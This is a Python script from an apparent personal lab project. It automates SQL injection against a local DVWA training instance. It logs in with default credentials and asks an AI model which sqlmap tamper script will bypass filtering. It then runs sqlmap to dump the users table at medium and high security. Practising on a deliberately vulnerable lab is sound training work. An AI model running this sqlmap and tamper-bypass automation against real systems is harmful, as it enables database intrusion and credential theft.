print("Advanced Trainer initialized", flush=True)
import time
import subprocess
import os
import sys
import re

# Add jarvis root to path to import local modules
sys.path.insert(0, "/home/arvind/jarvis")
from brain import jarvis_brain
from memory.learning import store_finding
from memory.database import save_finding
from ctf.rag import CTFRag

class SQLIAdvancedTrainer:
    def __init__(self):
        self.log_file = "/home/arvind/jarvis/memory_logs/sql_advanced.log"
        self.target_url = "http://localhost/vulnerabilities/sqli/"
        self.login_url = "http://localhost/login.php"
        self.cookies = {}
        self.model_info = "unknown"
        self.rag = CTFRag()
        
    def log(self, message):
        ts = time.strftime('%H:%M:%S')
        with open(self.log_file, "a") as f:
            f.write(f"[{ts}] {message}\n")
        print(f"[*] {message}")

    def get_cookies(self, security="medium"):
        self.log(f"Attempting to acquire session cookies (Security: {security})...")
        try:
            import requests
            s = requests.Session()
            
            def get_token(url):
                r = s.get(url)
                match = re.search(r"name='user_token' value='([a-f0-9]+)'", r.text)
                return match.group(1) if match else ""

            # 1. Login first time
            token = get_token(self.login_url)
            s.post(self.login_url, data={"username": "admin", "password": "password", "Login": "Login", "user_token": token})

            # 2. Setup
            token = get_token("http://localhost/setup.php")
            s.post("http://localhost/setup.php", data={"create_db": "Create / Reset Database", "user_token": token})

            # 3. Login again
            token = get_token(self.login_url)
            s.post(self.login_url, data={"username": "admin", "password": "password", "Login": "Login", "user_token": token})

            # 4. Set security level
            s.cookies.set("security", security, domain="localhost")
            
            self.cookies = s.cookies.get_dict()
            self.log(f"Acquired Session: {self.cookies.get('PHPSESSID')} (Security: {security})")
            return True
        except Exception as e:
            self.log(f"Failed to acquire cookies: {e}")
            return False

    def ask_ai(self, prompt, context=""):
        full_prompt = f"Context from previous memory:\n{context}\n\nTask: {prompt}"
        messages = [{"role": "user", "content": full_prompt}]
        system = "You are an elite SQL injection specialist. Suggest ONLY the name of a sqlmap tamper script (e.g., 'space2comment'). If none fit, suggest a custom technique mentioned in context. No extra text."
        try:
            reply, source = jarvis_brain(messages, system)
            self.model_info = source
            return reply.strip().lower()
        except Exception as e:
            self.log(f"AI Call failed: {e}")
            return "space2comment"

    def run_injection_probe(self, tamper=None, security="medium"):
        cookie_str = "; ".join([f"{k}={v}" for k, v in self.cookies.items()])
        
        if security == "high":
            # In High, input is on session-input.php and output is on sqli.php
            # We add --string to look for "First name" as a success indicator
            # and --union-cols=2 to help sqlmap
            cmd = ["sqlmap", "-u", "http://localhost/vulnerabilities/sqli/session-input.php", 
                   "--data", "id=1&Submit=Submit",
                   "--second-url", "http://localhost/vulnerabilities/sqli/",
                   "--batch", "--dump", "-T", "users", "--dbms=mysql", 
                   "--cookie", cookie_str, "--level", "5", "--risk", "3",
                   "--string", "First name", "--union-cols", "2", "--flush-session"]
        else:
            # In Medium, it's a simple POST to the same page
            cmd = ["sqlmap", "-u", "http://localhost/vulnerabilities/sqli/", 
                   "--data", "id=1&Submit=Submit",
                   "--batch", "--dump", "-T", "users", "--dbms=mysql", 
                   "--cookie", cookie_str, "--level", "5", "--risk", "3"]
        
        if tamper and len(tamper.split()) == 1: 
            cmd.extend(["--tamper", tamper])
        
        self.log(f"Probing with tamper: {tamper if tamper else 'None'} (Security: {security})")
        return subprocess.run(cmd, capture_output=True, text=True)

    def evolve(self, security="medium"):
        self.log(f"Initializing Advanced Ghost Protocol: SQLi RAG Evolution ({security})")
        if not self.get_cookies(security):
            self.log("Critical Failure: No session.")
            return False
            
        last_output = f"Baseline scan for {security} security."
        
        tampers = ["space2comment", "between", "randomcase", "charencode", "equaltolike", 
                   "base64encode", "modsecurityversioned", "modsecurityzeroversioned", 
                   "percentage", "overlongutf8", "nonrecursivereplacement"]
        
        for i in range(10):
            context = ""
            try:
                context = self.rag.get_combined_context(last_output, category="sql")
            except:
                context = "Use advanced bypass techniques like randomcase or space2comment."
                
            prompt = (
                f"Analyze this sqlmap output and suggest the best tamper script from this list: {tampers}. "
                f"Only return the name of the script. \n\nOutput: {last_output[-1000:]}"
            )
            
            suggestion = self.ask_ai(prompt, context)
            
            tamper = "space2comment"
            for t in tampers:
                if t in suggestion:
                    tamper = t
                    break
            
            self.log(f"[{self.model_info}] Suggests tamper: {tamper}")
            
            res = self.run_injection_probe(tamper, security)
            last_output = res.stdout
            
            if "database management system" in res.stdout or "users" in res.stdout or "admin" in res.stdout:
                self.log(f"SUCCESS: {tamper} vector bypassed {security} protection.")
                store_finding("localhost", f"SQLi Bypass SUCCESS with tamper: {tamper} (Security: {security})\nOutput: {res.stdout[:500]}", "CRITICAL")
                save_finding("localhost", "CRITICAL", "SQLi Bypass", f"Advanced Tamper {tamper} successfully extracted data from DVWA ({security}).")
                return True
            
            self.log(f"Attempt {i+1} failed.")
            
        self.log(f"Training Cycle Complete - Target ({security}) resisted all suggested vectors.")
        return False

if __name__ == "__main__":
    trainer = SQLIAdvancedTrainer()
    for level in ["medium", "high"]:
        trainer.evolve(level)
